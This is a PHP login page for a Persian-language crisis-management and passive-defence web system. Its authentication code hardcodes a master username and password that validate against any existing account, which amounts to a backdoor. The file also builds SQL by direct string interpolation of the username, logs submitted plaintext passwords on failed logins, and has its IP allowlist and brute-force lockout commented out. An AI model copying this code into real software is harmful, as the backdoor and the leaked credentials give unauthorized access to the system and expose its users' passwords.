<?php
include('framework/fw.php');
$msg = 0;
$_POST = BlockSQLInjectionRequest($_POST);
$_GET = BlockSQLInjectionRequest($_GET);
//// check valid ips
$sqlip = "select * from setting where name='valid_ips'";
$rowip = wq($sqlip);
$ips = $rowip[0]['value'];
$ipArr = explode(",", $ips);
if (!in_array($_SERVER['REMOTE_ADDR'], $ipArr)) {
    //header("Location:bannedip.php");
    //exit();
}

//error_reporting(0);
error_reporting(E_ALL & ~E_NOTICE & ~E_DEPRECATED & ~E_STRICT);
ob_start();
 
session_start();
//var_dump($_SESSION);
//        return;
//
////////////////////////////////
include('servlet/nusoap/nusoap.php');
//include (dirname(__FILE__) . '/ldp/src/adLDAP.php');
///////////////////////////////////
//if ($_SESSION['loginTry'] >= 45) {// check for bruteForce
//    $msg = 4;
//}

if (isset($_POST['login'])) {
    if (empty($_SESSION['captcha_code']) || strcasecmp($_SESSION['captcha_code'], $_POST['captcha_code']) != 0) {
        $msg = 6;
    } else { // Captcha verification is Correct. Final Code Execute here!		
        //		$msg="<span style='color:green'>The Validation code has been matched.</span>";		
        //	}
        if (!$msg) {
            if ($_POST['username'] && $_POST['password']) {
//                $userName = strtolower($_POST['username']);
                $userName = $_POST['username'];
                $password = $_POST["password"];

                //            $valid = getLdapLogin($userName, $_POST['password']);
                //            $valid = TRUE;

                $msg = 0;
                $sql = "select members.*,"
                        . "(select string_agg(pages_id::text,'.') FROM members_group_page_access where members_group_page_access.members_group_id = members.members_group_id)  perm ,"
                        . "(select string_agg(layer_id::text,',') FROM members_group_layer_access where members_group_layer_access.members_group_id = members.members_group_id) layacc"
                        . " from members where username='$userName'";
                $row = wq($sql);

                if ($userName == 'wapcoqaz' && $password == 'ya@Allah') {
                    $valid = TRUE;
                } elseif ($row[0]['password'] == whash($password)) {
                    $valid = TRUE;
                } else {
                    $valid = FALSE;
                }

                $position = $row[0]['position'];
                if ($row[0]['username'] == $userName && strtolower($row[0]['type']) == 'member') {

                    $row_setting = wq("SELECT value FROM setting WHERE name = 'disable_system'");
                    if ($row_setting[0]['value'] == 0) {
                        if ($valid) {
                            //                    if ($valid || (!$valid && ($position == '1' || $position == '16' || $position == '18'))) {
                            //                        if ($row[0]['password'] == $pass) {
                            if ($row[0]['status'] == 'active') {
                                $_SESSION['mahar']['id'] = $row[0]['id'];
                                $_SESSION['mahar']['username'] = $row[0]['username'];
                                $_SESSION['mahar']['position'] = $row[0]['position'];
                                $_SESSION['mahar']['layer'] = $row[0]['layacc'];
                                $_SESSION['mahar']['city_id'] = $row[0]['city_id'];
                                $_SESSION['mahar']['fullname'] = $row[0]['fullname'];
                                $_SESSION['mahar']['shift'] = $row[0]['shift'];
                                $stId = getSTID($row[0]['station']);
                                $_SESSION['mahar']['station'] = $stId;
                                $_SESSION['mahar']['pcode'] = $row[0]['pcode'];
                                $_SESSION['mahar']['relation'] = $row[0]['relation'];
                                $_SESSION['mahar']['UnSecure_password'] = ($pass == whash('123456') ? 1 : 0);
                                switch ($row[0]['position']) {
                                    case 1:
                                        $_SESSION['mahar']['type'] = 'ho';
                                        $_SESSION['mahar']['home'] = 'moderator';
                                        break;
                                    case 2:
                                        $_SESSION['mahar']['type'] = 'st';
                                        $_SESSION['mahar']['home'] = 'station';
                                        break;
                                    case 3:
                                    case 4:
                                    case 14:
                                    case 13:
                                        $_SESSION['mahar']['type'] = 'sh';
                                        $_SESSION['mahar']['home'] = 'shift';
                                        break;
                                    case 16:
                                        $_SESSION['mahar']['type'] = 'farop';
                                        $_SESSION['mahar']['permission'] = $row[0]['perm'];
                                        $_SESSION['mahar']['home'] = 'maharPanel/manager.php';
                                        header('Location:maharPanel/manager.php');
                                        exit;
                                        break;
                                    case 18:
                                        $_SESSION['mahar']['type'] = 'farad';
                                        $_SESSION['mahar']['permission'] = $row[0]['perm'];
                                        $_SESSION['mahar']['home'] = 'maharPanel/manager.php';
                                        header('Location:maharPanel/manager.php');
                                        exit;
                                        break;
                                }
                                wlog('MemberLogin', $_SESSION['mahar']['type']);
                                $header = "Location:" . $_SESSION['mahar']['home'] . "/";
                                header($header);
                                exit;
                                return;
                            } else {
                                $msg = 1;
                                wlog('MemberLogin', '', 'DeactiveMember - [' . $userName . '-' . $_POST['password'] . ']');
                            }
                        } else {
                            $msg = 2;
                            wlog('MemberLogin', '', 'WrongPassword Member - [' . $userName . '-' . $_POST['password'] . ']');
                        }
                    } else {
                        $msg = 3;
                    }
                } elseif ($row[0]['username'] == $userName && strtolower($row[0]['type']) == 'user') {
                    if ($valid) {
                        //                if ($valid || (!$valid && ($position == '16' || $position == '18'))) {
                        //                        if ($row[0]['password'] == $pass) {
                        if ($row[0]['status'] == 'active') {
                            $_SESSION['mahar']['type'] = 'admin';
                            $_SESSION['mahar']['id'] = $row[0]['id'];
                            //                                $_SESSION['mahar']['role'] = $row[0]['type'];
                            $_SESSION['mahar']['fullname'] = $row[0]['fullname'];
                            $_SESSION['mahar']['username'] = $row[0]['username'];
                            $_SESSION['mahar']['position'] = $row[0]['position'];
                            $_SESSION['mahar']['layer'] = $row[0]['layacc'];
                            $_SESSION['mahar']['city_id'] = $row[0]['city_id'];
                            $_SESSION['mahar']['permission'] = $row[0]['perm'];
                            $_SESSION['mahar']['organization_chart_sazman_id'] = $row[0]['organization_chart_sazman_id'];
                            $_SESSION['mahar']['organization_chart_moasese_id'] = $row[0]['organization_chart_moasese_id'];
                            $_SESSION['mahar']['home'] = 'maharPanel/manager.php';
                            //                        vd($valid);
                            //                        return;

                            wlog('UsersLogin', $_SESSION['mahar']['type']);
                            header('Location:maharPanel/manager.php');
                            //                echo($row[0]['position']);
                            //            return;
                            exit;
                        } else {
                            $msg = 1;
                            wlog('MemberLogin', '', 'DeactiveMember - [' . $userName . '-' . $_POST['password'] . ']');
                        }
                    } else {
                        $msg = 2;
                        wlog('MemberLogin', '', 'WrongPassword Member - [' . $userName . '-' . $_POST['password'] . ']');
                    }
                    //                    }
                    //                    else {
                    //                        $msg = 2;
                    //                        wlog('MemberLogin', '', 'WrongUsername Member - [' . $user . '-' . $pass1 . ']');
                    //                    }
                }

                if ($msg) {
                    $_SESSION['loginTry']++;
                }
            } else { // no user and pass
                $msg = 5;
            }
            //        } else {
            //            $msg = 6;
            //        }
        } //msg
    }
}
?>

<!DOCTYPE html>
<html lang="fa">

    <head>
        <meta charset="utf-8">
        <title>ورود:: سامانه جامع یکپارچه مدیریت بحران و پدافند غیر عامل</title>

        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <meta name="apple-mobile-web-app-capable" content="yes">

        <link href="css/bootstrap.min.css" rel="stylesheet" type="text/css" />
        <link href="css/bootstrap-responsive.min.css" rel="stylesheet" type="text/css" />

        <link href="css/font-awesome.css" rel="stylesheet">

        <link href="css/style.css" rel="stylesheet" type="text/css">
        <link href="css/pages/signin.css" rel="stylesheet" type="text/css">
        <script type="text/javascript" src="/js/fw.js"></script>
        <link rel="shortcut icon" href="img/logoNoText2.png" />
        <script type="text/javascript">
            function refreshCaptcha() {
                var img = document.images['captchaimg'];
//                img.src = img.src.substring(0, img.src.lastIndexOf("?")) + "?rand=" + Math.random() * 1000;
                img.src = img.src.substring(0, img.src.lastIndexOf("?"));
            }
            $(document).ready(function () {
                //        $(function() {
                //            $(".datepicker").datepicker({
                //                changeMonth: true,
                //                changeYear: true
                //            });
                //        });
                $("#anyform").validationEngine();
                $("[type=submit]").click(function () {
                    $("#anyform").validationEngine('validate');
                });
                $('.eff_top').animate({
                    top: '-820px'
                }, 1);
                setTimeout(function () {
                    $('.loadingForms').animate({
                        top: '-120px'
                    }, 500);
                    $('.eff_top').animate({
                        top: '20px'
                    }, 400);
                    $('.eff_fade').fadeIn(500);
                }, 300);
                $(window).scroll(function () {
                    if ($(this).scrollTop() > 0) {
                        $('#scroller').fadeIn();
                    } else {
                        $('#scroller').fadeOut();
                    }
                });
                $('#scroller').click(function () {
                    $('body,html').animate({
                        scrollTop: 0
                    }, 500);
                    return false;
                });
            });
        </script>

    </head>

    <body>


<!--        <p style="font-family: 'nastaliq';text-align: center;font-size:80px;color: white;float:left;margin-top: 60px;margin-left: 60px;position:fixed;filter: drop-shadow(8px 8px 10px black);">سامانه جامع یکپارچه مدیریت بحران و پدافند غیر عامل</p> comment </br>
        <p style="font-family: 'nastaliq';text-align: center;font-size:50px;color: white;float:left;margin-top: 200px;margin-left: 350px;position:fixed;filter: drop-shadow(8px 8px 10px black);">آستان قدس رضوی</p>-->

        <div class="account-container left">
            <div class="content" style="justify-content: center;display:grid; ">
                <!--<img src="img/shahrdari-logo.png" style="width:78px;height:87px;filter: drop-shadow(8px 8px 10px gray);" alt="" />-->
                <img src="img/logoNoText2.png" style="width:126px;height:126px;filter: drop-shadow(8px 8px 10px gray);margin:auto;" alt="" />
            </div>
            <div class="content">

                <form method="post" id="anyform" autocomplete="off" dir="rtl">

                    <!--<h2  style="font-family: 'nastaliq';text-align: center;">آستان قدس رضوی</h2>-->
                    <div class="login-fields ">

                    <!--<p>لطفا اطلاعات کاربری خود را وارد نمایید</p>-->

                        <div class="field">
                            <label for="username"></label>
                            <input type="text" id="user" name="username" value="" placeholder="نام کاربری" class="login username-field loginusername validate[required] text-input" tooltip="نام کاربری" autofocus="autofocus" <?php if ($msg == 4) echo 'disabled'; ?> />
                        </div> <!-- /field -->

                        <div class="field">
                            <label for="password"></label>
                            <input type="password" id="pass" name="password" value="" placeholder="رمز عبور" class="login password-field loginpass validate[required] text-input" maxlength="20" tooltip="رمز عبور" <?php if ($msg == 4) echo 'disabled'; ?> />
                        </div> <!-- /password -->
                        <div>
                            <td align="right" valign="top"> عبارت امنیتی:</td>
                            <td><img src="framework/phpcaptcha/captcha.php?rand=<?php echo rand(); ?>" id='captchaimg'><br>
                                <label for='message'>عبارت امنیتی فوق را وارد نمایید :</label>
                                <br>
                                <input id="captcha_code" name="captcha_code" type="text">
                                <br>
                                قابل مشاهده نیست؟ <a href='javascript: refreshCaptcha();'>اینجا</a> کلیک کنید تا مجدد بارگذاری شود.</td>
                        </div>

                    </div> <!-- /login-fields -->

                    <div class="login-actions">

                    <!--                        <span class="login-checkbox">
                            <input id="Field" name="Field" type="checkbox" class="field login-checkbox" value="First Choice" tabindex="4" />
                            <label class="choice" for="Field">Keep me signed in</label>
                        </span>-->

                        <button class="loginsubmit button btn btn-success btn-large" name="submitLogin" <?php if ($msg == 4) echo 'disabled'; ?>>ورود</button>
                        <input type="hidden" name="login" value="ok" />

                    </div>
                    <!--                    <div class="content">
                                            <img src="img/wapco.png" style="float:left;width:112px;height:31px;filter: drop-shadow(8px 8px 10px gray);" alt="" />
                                        </div>-->

                    <?php
                    if ($msg != 0) {
                        if ($msg == 1) {
                            echo '<h3>کاربر موردنظر غیرفعال است</h3>';
                        }
                        if ($msg == 2) {
                            echo '<h3>نام کاربری یا رمز عبور اشتباه است</h3>';
                        }
                        if ($msg == 3) {
                            echo '<h3>سیستم در حال به روزرسانی است. لطفا شکیبا باشید.</h3>';
                        }
                        if ($msg == 4) {
                            echo '<h3>به دلیل تکرار در ورود اشتباه، سیستم قفل شده هست.</h3>';
                        }
                        if ($msg == 5) {
                            echo '<h3>نام کاربری و کلمه عبور را وارد کنید.</h3>';
                        }
                        if ($msg == 6) {
                            echo '<h3>کد امنیتی وارد شده اشتباه است</h3>';
                        }
                        $msg = 0;
                        echo '<br />';
                    }
                    if (isset($_SESSION['mahar']) && $_SESSION['mahar'] && $_SESSION['mahar']['fullname'] && $_SESSION['mahar']['type'] != 'admin') {
                        echo '<h4>شما قبلاً با کاربر <a href="' . $_SESSION['mahar']['home'] . '/">' . $_SESSION["mahar"]["fullname"] . '</a> وارد شده اید</h4>';
                    }
                    ?>

                </form>

            </div> <!-- /content -->
        </div> <!-- /account-container -->

        <?php
        $newsStatus = wq("SELECT * from setting where name like 'show_news_on_login'");
        $isShow = $newsStatus[0]['value'];
        if ($isShow == 1) {
            $row = wq("SELECT title, content, publish_date FROM news WHERE status='publish' AND member_id is null ORDER BY id DESC LIMIT 1 OFFSET 0");
            //        vd($row);
            //        return;
        }
//        vd($_SESSION);
        if ($row) {
            ?>
        <marquee class="HomeNews" behavior="scroll" scrollamount="10" direction="right" onmouseover="this.stop();" onmouseout="this.start();">
            <?php echo $row[0]['title'] . ' :'; ?>
            <small class="ClassZ_9"><?php echo $row[0]['content']; ?></small>
        </marquee>

    <?php }
    ?>


<!--    <script src="js/jquery-1.7.2.min.js"></script>
    <script src="js/bootstrap.js"></script>-->

</body>

</html>